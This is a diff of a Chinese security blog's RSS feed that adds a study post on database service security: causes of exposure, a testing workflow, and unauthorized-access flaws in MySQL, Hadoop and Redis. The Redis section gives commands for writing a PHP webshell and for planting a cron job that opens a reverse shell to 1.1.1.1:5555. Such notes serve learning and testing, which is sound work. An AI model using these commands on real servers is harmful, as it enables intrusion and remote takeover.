@@ -1,5 +1,51 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>ReadPond</title><link>https://ReadPond-atack.github.io</link><description>言而欲止，止又欲言，胡言乱语，语无伦次，信口雌黄，逐渐癫狂~~~</description><copyright>ReadPond</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/252286375?v=4&amp;size=64</url><title>avatar</title><link>https://ReadPond-atack.github.io</link></image><lastBuildDate>Mon, 02 Mar 2026 10:49:49 +0000</lastBuildDate><managingEditor>ReadPond</managingEditor><ttl>60</ttl><webMaster>ReadPond</webMaster><item><title>Rust基础部分练习</title><link>https://ReadPond-atack.github.io/post/Rust-ji-chu-bu-fen-lian-xi.html</link><description>实验内容：使用Rust语言，做一个学生管理系统的Demo
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>ReadPond</title><link>https://ReadPond-atack.github.io</link><description>言而欲止，止又欲言，胡言乱语，语无伦次，信口雌黄，逐渐癫狂~~~</description><copyright>ReadPond</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/252286375?v=4&amp;size=64</url><title>avatar</title><link>https://ReadPond-atack.github.io</link></image><lastBuildDate>Mon, 02 Mar 2026 14:30:30 +0000</lastBuildDate><managingEditor>ReadPond</managingEditor><ttl>60</ttl><webMaster>ReadPond</webMaster><item><title>数据库安全</title><link>https://ReadPond-atack.github.io/post/shu-ju-ku-an-quan.html</link><description>#### 一、如何引发数据库服务的安全问题
+- 配置不当—未授权访问
+- 自身软件设计上存在缺陷—特定安全漏洞
+- 有些服务使用口令验证进行操作，由于用户疏忽没有及时更改相关口令或设置的口令过于简单—弱口令爆破
+
+#### 二、测试大致思路
+1. 判断服务是否开放
+&amp;emsp;- 端口扫描
+&amp;emsp;- 组合猜测
+&amp;emsp;- 信息来源
+2. 通过上一步进行端口信息判断服务类型
+&amp;emsp;- 数据库
+&amp;emsp;- 文件传输
+&amp;emsp;- 远程控制
+&amp;emsp;- 数据通讯
+3. 判断利用方式
+&amp;emsp;- 特性漏洞
+&amp;emsp;- 未授权访问
+&amp;emsp;- 弱口令爆破
+
+#### 三、常见数据库当中漏洞
+1. MySQL未授权访问CVE-2012-2122
+2. Hadoop未授权访问-内置配合命令执行RCE
+&amp;emsp;- Hadoop端口信息：50010
+3. Redis未授权访问-WEBShell&amp;任务&amp;密匙&amp;RCE等
+&amp;emsp;- 未授权访问的条件：
+&amp;emsp;&amp;emsp;- `bind 127.0.0.1`注释符开启则表示只能本地进行访问，如果被注释则可以通过外网访问
+&amp;emsp;&amp;emsp;- `protected-mode no` 安全模式选项为关闭
+&amp;emsp;&amp;emsp;- 没有设置密码`# requirepass foobared`
+&amp;emsp;- 写WebShell的条件：需要知道web路径以及web目录权限可读写,例如：
+```bash
+config set dir /tmp           # 设置WEB写入目录
+config set dbfilename 1.php   # 设置写入文件名
+set test'&lt;?php phpinfo();?&gt;'  # 设置写入文件内容
+bgsave						  # 保存执行
+save						  # 保存执行
+```
+
+&amp;emsp;&amp;emsp;&amp;emsp;- 写定时任务反弹shell
+&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;- 允许异地登录
+&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;- `protected-mode no` 安全模式选项为关闭
+```nix
+config set dir /var/spool/cron  # 记时目录路径
+set yy '\n\n\n*****bash -i&gt;&amp; /dev/tcp/1.1.1.1/5555 0&gt;&amp;1\n\n\n' # 写入任务代码
+config set dbfilename x	# 写入文件名
+save 	# 保存
+注意：centos会忽略乱码去执行正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败。</description><guid isPermaLink="true">https://ReadPond-atack.github.io/post/shu-ju-ku-an-quan.html</guid><pubDate>Mon, 02 Mar 2026 14:29:59 +0000</pubDate></item><item><title>Rust基础部分练习</title><link>https://ReadPond-atack.github.io/post/Rust-ji-chu-bu-fen-lian-xi.html</link><description>实验内容：使用Rust语言，做一个学生管理系统的Demo
 
 实验功能：
 &amp;emsp;1. 设置欢迎界面
